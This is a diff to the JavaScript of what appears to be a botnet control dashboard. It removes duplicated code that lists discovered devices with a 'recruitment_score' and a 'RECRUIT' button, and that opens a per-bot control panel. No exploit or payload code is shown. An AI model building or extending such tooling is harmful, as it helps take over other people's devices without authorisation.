@@ -4474,41 +4474,6 @@ Or manually execute the deployment script.
         function sendCommand() {
             sendTerminalCommand();
         }
-            container.innerHTML = '';
-            
-            if (!devices || devices.length === 0) {
-                container.innerHTML = '<div style="color: #666;">No devices discovered</div>';
-                return;
-            }
-            
-            devices.forEach(device => {
-                const deviceDiv = document.createElement('div');
-                deviceDiv.style.cssText = 'border: 1px solid #00ff9f; padding: 0.5rem; margin: 0.25rem; border-radius: 4px; background: rgba(0,255,159,0.05);';
-                
-                const services = device.services.map(s => `${s.service}:${s.port}`).join(', ');
-                
-                deviceDiv.innerHTML = `
-                    <div style="display: flex; justify-content: space-between; align-items: center;">
-                        <div>
-                            <strong>📡 ${device.ip}</strong> 
-                            <span style="color: #666;">(Score: ${device.recruitment_score})</span><br>
-                            <small>Services: ${services}</small>
-                        </div>
-                        <button class="btn btn-secondary" onclick="recruitDevice('${device.ip}', '${device.os}')">
-                            RECRUIT
-                        </button>
-                    </div>
-                `;
-                
-                container.appendChild(deviceDiv);
-            });
-        }
-        
-        
-        // Update sendCommand to use enhanced terminal
-        function sendCommand() {
-            sendTerminalCommand();
-        }
         
         // Auto-refresh and initialization - Optimized intervals to reduce CPU load
         setInterval(refreshDevices, 15000);  // Reduced from 3s to 15s
@@ -4727,29 +4692,6 @@ Or manually execute the deployment script.
                 closeBotControlPanel();
             }
         }
-        
-        // Modify device refresh to add click handlers for individual bot control
-        if (typeof originalRefreshDevices === 'undefined') {
-            var originalRefreshDevices = refreshDevices;
-        }
-        refreshDevices = async function() {
-            await originalRefreshDevices();
-            
-            // Add click handlers to device items for individual control
-            document.querySelectorAll('.device-item').forEach(deviceItem => {
-                deviceItem.style.cursor = 'pointer';
-                deviceItem.title = 'Click to open bot control panel';
-                deviceItem.addEventListener('click', function() {
-                    const deviceId = this.dataset.deviceId || 'unknown';
-                    const botInfo = {
-                        tags: ['mobile', 'recruited'], // This would be populated from actual device data
-                        platform: 'Android',
-                        ip: '192.168.1.100'
-                    };
-                    openBotControlPanel(deviceId, botInfo);
-                });
-            });
-        };
     </script>
     
     <!-- Individual Bot Control Panel -->
